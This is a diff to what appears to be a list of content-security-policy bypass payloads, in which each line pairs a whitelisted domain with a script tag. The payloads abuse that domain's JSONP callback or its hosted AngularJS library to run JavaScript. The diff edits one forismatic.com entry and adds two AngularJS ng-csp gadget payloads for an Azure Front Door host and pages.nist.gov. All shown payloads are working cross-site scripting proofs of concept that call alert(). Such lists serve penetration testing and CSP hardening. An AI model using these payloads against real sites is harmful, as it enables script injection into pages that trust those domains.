@@ -17,7 +17,7 @@ api.cxense.com	<script src="https://api.cxense.com/profile/user/segment?callback
 api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>
 api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
 api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>
-api.forismatic.com	<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert&lang=en"></script>
+api.forismatic.com	<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert(1)"></script>
 api.getdrip.com	<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>
 api.ipify.org	<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)//"></script>
 api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>
@@ -208,4 +208,6 @@ yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/j
 yugiohmonstrosdeduelo.blogspot.com	<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>
 zhike.help.360.cn	<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>
 omtr2.partners.salesforce.com   <script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
+resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net	<body ng-app ng-csp><script src="https://resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net/explorercdn/angular1.6/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+pages.nist.gov	<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 
